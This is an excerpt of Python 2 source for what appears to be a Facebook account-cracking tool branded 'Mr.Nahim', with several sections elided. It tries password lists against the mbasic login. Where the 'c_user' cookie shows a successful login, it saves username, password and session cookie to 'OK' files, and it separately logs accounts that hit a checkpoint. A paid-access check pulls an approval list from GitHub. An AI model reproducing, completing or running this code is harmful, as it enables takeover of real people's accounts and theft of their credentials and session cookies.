...
def reg():
    ...
    r = requests.get('https://raw.githubusercontent.com/Nahim404/paid404/main/Approval2.txt').text
    if to in r:
            ...
            while True:
                ...
                def __yan__(ysc = (None, None)):
                    ...
                    if cin == '':
                        ...
                        print '\n [%s+%s] Mr.Nahim OK file -> results/OK-%s-%s-%s.txt' % (O, N, ha, op, ta)
                        print ' [%s+%s] Mr.Nahim CP file-> results/CP-%s-%s-%s.txt' % (O, N, ha, op, ta)
    ...
    def __mbasic__(self, user, __yan__):
        ...
        for pw in __yan__:
            ...
            if 'c_user' in ses.cookies.get_dict().keys():
                ...
                print '\r%s[MR.-OK]    %s      | %s   %s' % (H, user, pw, N)
                wrt = ' [\xe2\x9c\x93] %s|%s|%s' % (user, pw, kuki)
                ok.append(wrt)
                open('saved/MR.-OK-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                break
                continue
                continue
            if 'checkpoint' in ses.cookies.get_dict().keys():
                ...
                try:
                    ...
                    print '\r%s[MR.-CP]   %s   | %s | %s %s %s %s' % (K, user, pw, day, month, year, N)
                    wrt = ' [\xc3\x97] %s|%s|%s %s %s' % (user, pw, day, month, year)
                    cp.append(wrt)
                    open('saved/MR.-CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                except (KeyError, IOError):
                    month = ''
                    day = ''
                    year = ''
                ...
                print '\r%s[MR.-CP]    %s     | %s %s' % (K, user, pw, N)
